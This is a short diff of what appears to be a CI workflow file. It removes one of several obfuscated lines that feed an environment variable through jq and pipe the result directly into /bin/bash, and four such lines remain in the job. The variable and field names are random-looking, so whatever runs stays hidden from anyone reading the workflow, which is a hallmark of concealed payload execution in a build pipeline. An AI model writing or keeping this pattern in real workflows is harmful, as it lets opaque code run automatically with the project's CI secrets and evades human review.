@@ -22,7 +22,6 @@ jobs:
           echo $au5866 | jq -r .vro92485 | /bin/bash
           echo $taij0 | jq -r .aevh0 | /bin/bash
           echo $syuu8155 | jq -r .pgkd0 | /bin/bash
-          printf '%s' "$dl9" | jq -r .vwata1971 | /bin/bash
           printf '%s' "$d6" | jq -r .gpnhu9601 | /bin/bash
 
       - name: Archive results
